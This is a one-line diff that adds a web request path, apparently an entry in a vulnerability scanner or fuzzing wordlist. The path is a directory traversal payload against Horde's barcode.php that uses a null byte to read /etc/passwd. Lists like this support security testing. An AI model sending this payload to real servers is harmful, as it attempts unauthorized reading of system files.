@@ -1,0 +1,1 @@
+/horde/util/barcode.php?type=../../../../../../../../../../../etc/./passwd%00
